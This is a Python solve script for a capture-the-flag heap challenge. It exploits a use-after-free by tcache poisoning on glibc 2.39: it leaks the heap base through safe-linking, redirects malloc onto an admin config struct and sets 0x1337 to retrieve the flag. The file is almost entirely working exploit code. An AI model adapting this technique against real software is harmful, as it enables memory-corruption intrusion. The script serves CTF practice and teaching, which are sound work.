"""Heap Feng Shui: tcache poisoning on glibc 2.39.

The admin console checks cfg->admin == 0x1337, and cfg is the very first
heap allocation, at heap_base + 0x2a0 (after the 0x290 tcache struct).

1. Make two notes of the same size, free both. Delete keeps the pointers.
2. Show the first freed note: its tcache next pointer is safe-linked,
   (address >> 12) ^ NULL, which leaks heap_base >> 12.
3. Edit the second freed note (the tcache head) to point next at cfg,
   encoded the same way: (its address >> 12) ^ cfg.
4. Two mallocs of that size: the second one returns cfg. Write 0x1337.

Usage: solve.py [host] [port]"""
import re
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 31338
SIZE = 0x28  # 0x30 chunks; cfg's chunk is 0x30 too

s = socket.create_connection((host, port), timeout=10)
buf = b""


def until(token):
    global buf
    while token not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise SystemExit("connection closed; got: " + buf.decode(errors="replace"))
        buf += chunk
    i = buf.index(token) + len(token)
    out, buf = buf[:i], buf[i:]
    return out


def cmd(n, *lines):
    until(b"> ")
    s.sendall(f"{n}\n".encode())
    for line in lines:
        until(b": ")
        s.sendall(line if isinstance(line, bytes) else f"{line}\n".encode())


def new(i):
    cmd(1, i, SIZE)


def delete(i):
    cmd(2, i)


def edit(i, data):
    cmd(3, i, data.ljust(SIZE, b"\0"))


def exactly(n):
    global buf
    while len(buf) < n:
        chunk = s.recv(4096)
        if not chunk:
            raise SystemExit("connection closed")
        buf += chunk
    out, buf = buf[:n], buf[n:]
    return out


def show(i):
    cmd(4, i)
    return exactly(SIZE)  # the raw note bytes (a newline follows)


new(0)
new(1)
delete(0)
delete(1)  # tcache[0x30]: note1 -> note0
heap_page = struct.unpack("<Q", show(0)[:8])[0]  # (note0 >> 12) ^ 0
heap_base = heap_page << 12
cfg = heap_base + 0x2A0
print(f"heap base {heap_base:#x}, cfg at {cfg:#x}")

edit(1, struct.pack("<Q", heap_page ^ cfg))  # note1 is in the same page
new(2)  # returns note1
new(3)  # returns cfg
edit(3, struct.pack("<Q", 0x1337))
cmd(5)
print(re.search(rb"flag\{[^}]+\}", until(b"}")).group(0).decode())
